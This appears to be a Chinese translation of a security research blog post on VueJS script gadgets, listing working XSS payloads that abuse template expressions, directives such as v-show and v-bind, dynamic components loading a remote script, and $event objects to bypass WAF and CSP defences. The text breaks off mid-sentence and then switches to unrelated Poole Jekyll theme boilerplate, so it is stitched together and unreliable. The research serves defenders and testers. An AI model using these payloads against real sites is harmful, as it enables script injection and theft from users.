---
layout: post
title: 使用VueJS脚本gadgets规避防御
---

## 介紹
我们发现，流行的JavaScript框架VueJS提供了对网站安全有严重影响的功能。如果您遇到使用Vue的Web应用程序，本篇文章将帮助您识别由gadgets脚本创建的Vue特定XSS向量，您可以使用这些gadgets脚本来利用目标。

gadgets脚本是由框架创建的额外功能，可以导致JavaScript执行。这些功能可以是JavaScript或基于HTML的。gadgets脚本通常对绕过WAF和CSP等防御措施很有用。从开发者的角度来看，了解一个框架或库创建的所有gadgets脚本也是很有用的；当允许用户在自己的Web应用程序中输入时，这些知识可以帮助防止XSS漏洞。在本篇文章中，我们将涵盖从基于表达式的向量到突变XSS（mXSS）等多种技术。

### 注意
这里有很多信息!如果你对学习攻击感兴趣，你可能会想读完这本书。但如果你遇到了特定的场景，只是需要一个解决它的向量，你可以直接跳到我们[XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)中新更新的VueJS部分。

在这篇文章中，我们将涵盖:

1.指令

2.缩短有效载荷

3.事件

4.突变

5.为V3调整有效载荷

6.传送

7.使用案例


## 一切都是从哪里开始的？

在[推特](https://twitter.com/PortSwiggerRes/status/1265647826383634432?s=20)上讨论各种 VueJS 攻击的时候，我、[Lewis Ardern](https://twitter.com/LewisArdern) 和 [PwnFunction](https://twitter.com/PwnFunction) 决定创建一篇博文来更详细地介绍它们。我们的合作非常有趣，并想出了一些有趣的向量。这一切都始于尝试缩减以下[VueJS XSS向量](https://portswigger-labs.net/xss/vuejs2.php?x=%7B%7BtoString().constructor.constructor(%27alert(1)%27)()%7D%7D)。
```
{{toString().constructor.constructor('alert(1)')()}}
```

为了找出如何缩减它，我们需要看看我们的向量是如何被转换的。我们查看VueJS源码，搜索Function构造函数的调用。有些情况下，Function构造函数被调用了，但创建的函数却没有。我们跳过了这些实例，因为我们确信这不是我们的代码被转换的地方。[在第11648行，我们最终找到了一个调用生成函数的Function构造函数](https://github.com/vuejs/vue/blob/6fe07ebf5ab3fea1860c59fe7cdd2ec1b760f9b0/src/compiler/to-function.js#L14)。
```
return new Function(code)
```

我们在这一行添加了一个断点，并刷新了页面。然后我们检查了代码变量的内容，果然，我们可以看到我们的向量。代码在一个with语句中，后面是一个return语句。因此，执行代码的范围是在with语句中指定的对象内。基本上，这意味着没有全局的alert()函数，但在with范围内，有VueJS函数，如_c、_v和_s。

如果我们使用这些函数，我们就可以减少表达式的大小。这个函数的构造函数将是Function构造函数，它允许我们执行代码。这意味着我们可以将向量减少到。
```
{{_c.constructor('alert(1)')()}}
```

### 调试VueJS
在我们继续之前，也许应该先快速了解一下我们使用的调试工具。

[Vue Devtools](https://github.com/vuejs/vue-devtools)。官方的浏览器扩展，可以用来调试用VueJS构建的应用。

[Vue-template-compiler](https://www.npmjs.com/package/vue-template-compiler)。将模板编译成渲染函数，这可以帮助我们看到Vue内部如何表示模板。这个工具有一个方便的在线版本，叫做template-explorer。

我们还不时地重写VueJS原型，添加日志等功能，以便我们可以看到内部发生的事情。

## VueJS第2版
### 指令
就像其他框架一样，VueJS中的一些指令让我们的生活变得更轻松.几乎每一个VueJS指令都可以作为一个gadgets来利用。让我们来看一个例子。

#### v-show指令

```
<p v-show="_c.constructor`alert(1)`()">
```
这是一段比较简单的代码。有一个叫做v-show的指令，用来根据逻辑条件从DOM中显示或隐藏一个元素。在这种情况下，条件就是向量。

这个非常相同的向量可以应用于其他指令，包括v-for、v-model、v-on等。

#### v-on指令
```
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
```

#### v-bind 指令
```
<x v-bind:a='_b.constructor`alert(1)`()'>
```
这些gadgets的多样性可以帮助你创建灵活的向量，可以很容易地用于绕过WAFs。

### 最小化向量
最小化向量--也被称为 "代码高尔夫"--意味着找到用尽可能少的字符或字节达到同样结果的方法。我们最初假设最短的向量是模板表达式，这意味着我们必须使用4个字节来添加所需的大括号{{ }}。然而，这个假设被证明是错误的。

我们花了大量的时间调试、查看源代码和阅读文档。我们找不到任何通过模板缩短矢量的方法，于是我们开始研究标签。

我们从35个字节开始，最终向上爬。但在这个过程中，通过使用VueJS解析器的怪癖，我们发现了一些非常有趣的向量。
```
<x @[_b.constructor`alert(1)`()]> (35 bytes)
<x :[_b.constructor`alert(1)`()]>  (33 bytes)
<p v-=_c.constructor`alert(1)`()> (33 bytes)
<x #[_c.constructor`alert(1)`()]> (33 bytes)
<p :=_c.constructor`alert(1)`()> (32 bytes)
```

但短的还是模板向量。
```
{{_c.constructor('alert(1)')()}}  (32 bytes)
{{_b.constructor`alert(1)`()}}    (30 bytes)
```
在尝试了无数种方法来编写高尔夫代码，只是为了能让它在30个字节以内，我们最终在Vue API中遇到了动态组件。

动态组件本质上是可以在稍后的时间点改变为不同的组件。这是通过使用标签上的is属性实现的。考虑下面的例子。
```
<x v-bind:is="'script'" src="//14.rs" />
```

这可以缩短为：
```
<x is=script src=//⑭.₨>
```

现在只有23个字节了！这是我们在整个研究过程中能想到的VueJS v2最短的向量。这是我们在整个研究过程中能想到的VueJS v2最短的向量。

### 事件
就像AngularJS一样，VueJS定义了一个名为$event的特殊对象，它引用了浏览器中的事件对象。使用这个$event对象，你可以访问浏览器窗口对象，允许你调用任何你喜欢的东西。
```
<img src @error="e=$event.path;e[e.length-1].alert(1)">
<img src @error="e=$event.path.pop().alert(1)">
```

我们确定@error会对一个表达式进行评估，因为VueJS提供了速记语法，这使得你可以用@代替使用v-on指令为错误或点击等事件的处理程序打前缀。文档中还透露，你可以使用$event变量来访问原始DOM事件。

这些向量的工作得益于Chrome在事件执行时定义的一个特殊路径属性。这个属性包含一个触发事件的对象数组。对我们来说至关重要的是，窗口对象总是这个数组中的最后一个元素。composedPath()函数会在其他浏览器中生成一个类似的数组，这使得我们可以构建一个跨浏览器向量，如下所示。














There are currently two themes built on Poole:

* [Hyde](http://hyde.getpoole.com)
* [Lanyon](http://lanyon.getpoole.com)

Learn more and contribute on [GitHub]({{ site.github.repo }}).

## What's included

Poole is a streamlined Jekyll site designed and built as a foundation for building more meaningful themes. Poole, and every theme built on it like this one, includes the following:

* Complete Jekyll setup included (layouts, config, [404]({{ '404.html' | relative_url }}), [RSS feed]({{ 'atom.xml' | relative_url }}), posts, [archive page]({{ 'archive' | relative_url }}), and [example page]({{ 'about' | relative_url }}))
* Mobile friendly design and development
* Easily scalable text and component sizing with `rem` units in the CSS
* Support for a wide gamut of HTML elements
* Related posts (time-based, because Jekyll) below each post
* Syntax highlighting, courtesy Jekyll's built-in support for Rouge

Additional features are available in individual themes.

## Browser support

Poole and its themes are by preference a forward-thinking project. In addition to the latest versions of Chrome, Safari (mobile and desktop), Firefox, and Edge.

## Download

These themes are developed on and hosted with GitHub. Head to the [GitHub repository]({{ site.github.repo }}) for downloads, bug reports, and features requests.

Thanks!
